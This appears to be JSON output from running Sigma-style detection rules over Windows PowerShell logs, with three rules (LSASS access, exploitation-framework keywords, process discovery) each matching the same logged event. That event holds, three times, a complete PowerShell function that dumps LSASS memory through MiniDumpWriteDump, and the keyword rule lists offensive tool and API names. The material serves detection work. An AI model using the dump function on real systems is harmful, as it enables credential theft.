[{
  "title": "PowerShell Get-Process LSASS in ScriptBlock",
  "id": "84c174ab-d3ef-481f-9c86-a50d0b8e3edb",
  "description": "Detects a Get-Process command on lsass process, which is in almost all cases a sign of malicious activity",
  "sigmafile": "",
  "sigma": [
    "SELECT * FROM logs WHERE (Channel='Microsoft-Windows-PowerShell/Operational' OR Channel='PowerShellCore/Operational') AND (EventID=4104 AND ScriptBlockText LIKE '%Get-Process lsass%' ESCAPE '\\')"
  ],
  "rule_level": "high",
  "tags": [
    "attack.credential-access",
    "attack.t1003.001"
  ],
  "count": 1,
  "matches": [
    {
      "row_id": 1,
      "ActivityID": "4AA5EAE3-4F33-0001-3A2B-A64A334FD601",
      "Channel": "Microsoft-Windows-PowerShell/Operational",
      "Computer": "MSEDGEWIN10",
      "EventID": 4104,
      "EventRecordID": 971,
      "Guid": "A0C1853B-5C40-4B15-8766-3CF1C58F985A",
      "Keywords": "0x0",
      "Level": 3,
      "MessageNumber": 1,
      "MessageTotal": 1,
      "Opcode": 15,
      "OriginalLogfile": "Powershell_4104_MiniDumpWriteDump_Lsass.evtx",
      "Path": "C:\\Users\\Public\\lsass_wer_ps.ps1",
      "ProcessID": 7008,
      "Provider_Name": "Microsoft-Windows-PowerShell",
      "ScriptBlockId": "27f08bda-c330-419f-b83b-eb5c0f699930",
      "ScriptBlockText": "function Memory($path)\r\n{\r\n\t\t\t  \r\n\t\t\t  \r\n\t\t$Process = Get-Process lsass\r\n\t\t$DumpFilePath = $path\r\n\t\t\r\n\t\t$WER = [PSObject].Assembly.GetType('System.Management.Automation.WindowsErrorReporting')\r\n\t\t$WERNativeMethods = $WER.GetNestedType('NativeMethods', 'NonPublic')\r\n\t\t$Flags = [Reflection.BindingFlags] 'NonPublic, Static'\r\n\t\t$MiniDumpWriteDump = $WERNativeMethods.GetMethod('MiniDumpWriteDump', $Flags)\r\n\t\t$MiniDumpWithFullMemory = [UInt32] 2\r\n\t\r\n\t\t\t\r\n\t\t\t  #\r\n\t\t$ProcessId = $Process.Id\r\n\t\t$ProcessName = $Process.Name\r\n\t\t$ProcessHandle = $Process.Handle\r\n\t\t$ProcessFileName = \"$($ProcessName).dmp\"\r\n\t\t\r\n\t\t$ProcessDumpPath = Join-Path $DumpFilePath $ProcessFileName\r\n\t\t\r\n\t\t$FileStream = New-Object IO.FileStream($ProcessDumpPath, [IO.FileMode]::Create)\r\n\t\t\t  \r\n\t\t$Result = $MiniDumpWriteDump.Invoke($null, @($ProcessHandle,\r\n\t\t\t\t\t\t\t\t\t\t\t\t\t$ProcessId,\r\n\t\t\t\t\t\t\t\t\t\t\t\t\t$FileStream.SafeFileHandle,\r\n\t\t\t\t\t\t\t\t\t\t\t\t\t$MiniDumpWithFullMemory,\r\n\t\t\t\t\t\t\t\t\t\t\t\t\t[IntPtr]::Zero,\r\n\t\t\t\t\t\t\t\t\t\t\t\t\t[IntPtr]::Zero,\r\n\t\t\t\t\t\t\t\t\t\t\t\t\t[IntPtr]::Zero))\r\n\t\t\t  \r\n\t\t$FileStream.Close()\r\n\t\t\r\n\t\tif (-not $Result)\r\n\t\t{\r\n\t\t\t$Exception = New-Object ComponentModel.Win32Exception\r\n\t\t\t$ExceptionMessage = \"$($Exception.Message) ($($ProcessName):$($ProcessId))\"\r\n\t\t\t\r\n\t\t\t# Remove any partially written dump files. For example, a partial dump will be written\r\n\t\t\t# in the case when 32-bit PowerShell tries to dump a 64-bit process.\r\n\t\t\tRemove-Item $ProcessDumpPath -ErrorAction SilentlyContinue\r\n\t\t\t\r\n\t\t\tthrow $ExceptionMessage\r\n\t\t}\r\n\t\telse\r\n\t\t{\r\n\t\t\t\"Memdump complete!\"\r\n\t\t}\r\n\t\r\n}",
      "SystemTime": "2020-06-30T14:24:08.254605Z",
      "Task": 2,
      "ThreadID": 6488,
      "UserID": "S-1-5-21-3461203602-4096304019-2269080069-1000",
      "Version": 1
    }
  ]
},
{
  "title": "Malicious PowerShell Keywords",
  "id": "f62176f3-8128-4faa-bf6c-83261322e5eb",
  "description": "Detects keywords from well-known PowerShell exploitation frameworks",
  "sigmafile": "",
  "sigma": [
    "SELECT * FROM logs WHERE (Channel='Microsoft-Windows-PowerShell/Operational' OR Channel='PowerShellCore/Operational') AND (EventID=4104 AND (ScriptBlockText LIKE '%AdjustTokenPrivileges%' ESCAPE '\\' OR ScriptBlockText LIKE '%IMAGE\\_NT\\_OPTIONAL\\_HDR64\\_MAGIC%' ESCAPE '\\' OR ScriptBlockText LIKE '%Metasploit%' ESCAPE '\\' OR ScriptBlockText LIKE '%Microsoft.Win32.UnsafeNativeMethods%' ESCAPE '\\' OR ScriptBlockText LIKE '%Mimikatz%' ESCAPE '\\' OR ScriptBlockText LIKE '%MiniDumpWriteDump%' ESCAPE '\\' OR ScriptBlockText LIKE '%PAGE\\_EXECUTE\\_READ%' ESCAPE '\\' OR ScriptBlockText LIKE '%ReadProcessMemory.Invoke%' ESCAPE '\\' OR ScriptBlockText LIKE '%SE\\_PRIVILEGE\\_ENABLED%' ESCAPE '\\' OR ScriptBlockText LIKE '%SECURITY\\_DELEGATION%' ESCAPE '\\' OR ScriptBlockText LIKE '%TOKEN\\_ADJUST\\_PRIVILEGES%' ESCAPE '\\' OR ScriptBlockText LIKE '%TOKEN\\_ALL\\_ACCESS%' ESCAPE '\\' OR ScriptBlockText LIKE '%TOKEN\\_ASSIGN\\_PRIMARY%' ESCAPE '\\' OR ScriptBlockText LIKE '%TOKEN\\_DUPLICATE%' ESCAPE '\\' OR ScriptBlockText LIKE '%TOKEN\\_ELEVATION%' ESCAPE '\\' OR ScriptBlockText LIKE '%TOKEN\\_IMPERSONATE%' ESCAPE '\\' OR ScriptBlockText LIKE '%TOKEN\\_INFORMATION\\_CLASS%' ESCAPE '\\' OR ScriptBlockText LIKE '%TOKEN\\_PRIVILEGES%' ESCAPE '\\' OR ScriptBlockText LIKE '%TOKEN\\_QUERY%' ESCAPE '\\'))"
  ],
  "rule_level": "medium",
  "tags": [
    "attack.execution",
    "attack.t1059.001"
  ],
  "count": 1,
  "matches": [
    {
      "row_id": 1,
      "ActivityID": "4AA5EAE3-4F33-0001-3A2B-A64A334FD601",
      "Channel": "Microsoft-Windows-PowerShell/Operational",
      "Computer": "MSEDGEWIN10",
      "EventID": 4104,
      "EventRecordID": 971,
      "Guid": "A0C1853B-5C40-4B15-8766-3CF1C58F985A",
      "Keywords": "0x0",
      "Level": 3,
      "MessageNumber": 1,
      "MessageTotal": 1,
      "Opcode": 15,
      "OriginalLogfile": "Powershell_4104_MiniDumpWriteDump_Lsass.evtx",
      "Path": "C:\\Users\\Public\\lsass_wer_ps.ps1",
      "ProcessID": 7008,
      "Provider_Name": "Microsoft-Windows-PowerShell",
      "ScriptBlockId": "27f08bda-c330-419f-b83b-eb5c0f699930",
      "ScriptBlockText": "function Memory($path)\r\n{\r\n\t\t\t  \r\n\t\t\t  \r\n\t\t$Process = Get-Process lsass\r\n\t\t$DumpFilePath = $path\r\n\t\t\r\n\t\t$WER = [PSObject].Assembly.GetType('System.Management.Automation.WindowsErrorReporting')\r\n\t\t$WERNativeMethods = $WER.GetNestedType('NativeMethods', 'NonPublic')\r\n\t\t$Flags = [Reflection.BindingFlags] 'NonPublic, Static'\r\n\t\t$MiniDumpWriteDump = $WERNativeMethods.GetMethod('MiniDumpWriteDump', $Flags)\r\n\t\t$MiniDumpWithFullMemory = [UInt32] 2\r\n\t\r\n\t\t\t\r\n\t\t\t  #\r\n\t\t$ProcessId = $Process.Id\r\n\t\t$ProcessName = $Process.Name\r\n\t\t$ProcessHandle = $Process.Handle\r\n\t\t$ProcessFileName = \"$($ProcessName).dmp\"\r\n\t\t\r\n\t\t$ProcessDumpPath = Join-Path $DumpFilePath $ProcessFileName\r\n\t\t\r\n\t\t$FileStream = New-Object IO.FileStream($ProcessDumpPath, [IO.FileMode]::Create)\r\n\t\t\t  \r\n\t\t$Result = $MiniDumpWriteDump.Invoke($null, @($ProcessHandle,\r\n\t\t\t\t\t\t\t\t\t\t\t\t\t$ProcessId,\r\n\t\t\t\t\t\t\t\t\t\t\t\t\t$FileStream.SafeFileHandle,\r\n\t\t\t\t\t\t\t\t\t\t\t\t\t$MiniDumpWithFullMemory,\r\n\t\t\t\t\t\t\t\t\t\t\t\t\t[IntPtr]::Zero,\r\n\t\t\t\t\t\t\t\t\t\t\t\t\t[IntPtr]::Zero,\r\n\t\t\t\t\t\t\t\t\t\t\t\t\t[IntPtr]::Zero))\r\n\t\t\t  \r\n\t\t$FileStream.Close()\r\n\t\t\r\n\t\tif (-not $Result)\r\n\t\t{\r\n\t\t\t$Exception = New-Object ComponentModel.Win32Exception\r\n\t\t\t$ExceptionMessage = \"$($Exception.Message) ($($ProcessName):$($ProcessId))\"\r\n\t\t\t\r\n\t\t\t# Remove any partially written dump files. For example, a partial dump will be written\r\n\t\t\t# in the case when 32-bit PowerShell tries to dump a 64-bit process.\r\n\t\t\tRemove-Item $ProcessDumpPath -ErrorAction SilentlyContinue\r\n\t\t\t\r\n\t\t\tthrow $ExceptionMessage\r\n\t\t}\r\n\t\telse\r\n\t\t{\r\n\t\t\t\"Memdump complete!\"\r\n\t\t}\r\n\t\r\n}",
      "SystemTime": "2020-06-30T14:24:08.254605Z",
      "Task": 2,
      "ThreadID": 6488,
      "UserID": "S-1-5-21-3461203602-4096304019-2269080069-1000",
      "Version": 1
    }
  ]
},
{
  "title": "Suspicious Process Discovery With Get-Process",
  "id": "af4c87ce-bdda-4215-b998-15220772e993",
  "description": "Get the processes that are running on the local computer.",
  "sigmafile": "",
  "sigma": [
    "SELECT * FROM logs WHERE (Channel='Microsoft-Windows-PowerShell/Operational' OR Channel='PowerShellCore/Operational') AND (EventID=4104 AND ScriptBlockText LIKE '%Get-Process%' ESCAPE '\\')"
  ],
  "rule_level": "low",
  "tags": [
    "attack.discovery",
    "attack.t1057"
  ],
  "count": 1,
  "matches": [
    {
      "row_id": 1,
      "ActivityID": "4AA5EAE3-4F33-0001-3A2B-A64A334FD601",
      "Channel": "Microsoft-Windows-PowerShell/Operational",
      "Computer": "MSEDGEWIN10",
      "EventID": 4104,
      "EventRecordID": 971,
      "Guid": "A0C1853B-5C40-4B15-8766-3CF1C58F985A",
      "Keywords": "0x0",
      "Level": 3,
      "MessageNumber": 1,
      "MessageTotal": 1,
      "Opcode": 15,
      "OriginalLogfile": "Powershell_4104_MiniDumpWriteDump_Lsass.evtx",
      "Path": "C:\\Users\\Public\\lsass_wer_ps.ps1",
      "ProcessID": 7008,
      "Provider_Name": "Microsoft-Windows-PowerShell",
      "ScriptBlockId": "27f08bda-c330-419f-b83b-eb5c0f699930",
      "ScriptBlockText": "function Memory($path)\r\n{\r\n\t\t\t  \r\n\t\t\t  \r\n\t\t$Process = Get-Process lsass\r\n\t\t$DumpFilePath = $path\r\n\t\t\r\n\t\t$WER = [PSObject].Assembly.GetType('System.Management.Automation.WindowsErrorReporting')\r\n\t\t$WERNativeMethods = $WER.GetNestedType('NativeMethods', 'NonPublic')\r\n\t\t$Flags = [Reflection.BindingFlags] 'NonPublic, Static'\r\n\t\t$MiniDumpWriteDump = $WERNativeMethods.GetMethod('MiniDumpWriteDump', $Flags)\r\n\t\t$MiniDumpWithFullMemory = [UInt32] 2\r\n\t\r\n\t\t\t\r\n\t\t\t  #\r\n\t\t$ProcessId = $Process.Id\r\n\t\t$ProcessName = $Process.Name\r\n\t\t$ProcessHandle = $Process.Handle\r\n\t\t$ProcessFileName = \"$($ProcessName).dmp\"\r\n\t\t\r\n\t\t$ProcessDumpPath = Join-Path $DumpFilePath $ProcessFileName\r\n\t\t\r\n\t\t$FileStream = New-Object IO.FileStream($ProcessDumpPath, [IO.FileMode]::Create)\r\n\t\t\t  \r\n\t\t$Result = $MiniDumpWriteDump.Invoke($null, @($ProcessHandle,\r\n\t\t\t\t\t\t\t\t\t\t\t\t\t$ProcessId,\r\n\t\t\t\t\t\t\t\t\t\t\t\t\t$FileStream.SafeFileHandle,\r\n\t\t\t\t\t\t\t\t\t\t\t\t\t$MiniDumpWithFullMemory,\r\n\t\t\t\t\t\t\t\t\t\t\t\t\t[IntPtr]::Zero,\r\n\t\t\t\t\t\t\t\t\t\t\t\t\t[IntPtr]::Zero,\r\n\t\t\t\t\t\t\t\t\t\t\t\t\t[IntPtr]::Zero))\r\n\t\t\t  \r\n\t\t$FileStream.Close()\r\n\t\t\r\n\t\tif (-not $Result)\r\n\t\t{\r\n\t\t\t$Exception = New-Object ComponentModel.Win32Exception\r\n\t\t\t$ExceptionMessage = \"$($Exception.Message) ($($ProcessName):$($ProcessId))\"\r\n\t\t\t\r\n\t\t\t# Remove any partially written dump files. For example, a partial dump will be written\r\n\t\t\t# in the case when 32-bit PowerShell tries to dump a 64-bit process.\r\n\t\t\tRemove-Item $ProcessDumpPath -ErrorAction SilentlyContinue\r\n\t\t\t\r\n\t\t\tthrow $ExceptionMessage\r\n\t\t}\r\n\t\telse\r\n\t\t{\r\n\t\t\t\"Memdump complete!\"\r\n\t\t}\r\n\t\r\n}",
      "SystemTime": "2020-06-30T14:24:08.254605Z",
      "Task": 2,
      "ThreadID": 6488,
      "UserID": "S-1-5-21-3461203602-4096304019-2269080069-1000",
      "Version": 1
    }
  ]
}]